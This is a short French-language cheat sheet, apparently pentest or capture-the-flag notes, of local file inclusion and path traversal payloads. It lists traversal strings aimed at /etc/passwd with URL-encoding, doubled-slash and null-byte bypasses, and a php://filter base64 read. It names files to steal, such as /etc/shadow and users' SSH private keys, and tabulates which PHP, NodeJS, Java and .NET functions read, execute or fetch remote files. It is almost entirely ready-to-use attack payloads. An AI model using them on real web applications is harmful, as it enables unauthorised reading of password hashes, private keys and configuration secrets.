### Techniques de base:

`=/etc/passwd`

`=../../../../../../etc/passwd`

`=....//....//....//....//....//....//....//etc/passwd`

`=....////....////....////....////....////etc/passwd`

`=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd (url encode)`

`=/gallery/../../../../../../../etc/passwd (en cas d'obligation de la présence d'un chemin approuvé dans l'url)`

`=../../../../etc/passwd%00 (null byte)`

---
### PHP filters:

```url
php://filter/read=convert.base64-encode/resource=../../../etc/passwd
```

---
Fichiers intéressants à lire :

```
/etc/passwd
/proc/$PID/cmdline (générer une wordlist avec des chiffres de 1 à 1000)
/etc/shadow
/home/$user/.ssh/id_rsa
/var/www/html/fichierdeconfig.php
/var/www/html/LesDifférentesPages // permet de voir le code source éventuellement)

```


---

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| ----- | :-----: | :-----: | :-----: |
| **PHP** |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()`/`file()` | ✅ | ❌ | ❌ |
| **NodeJS** |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** | |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |
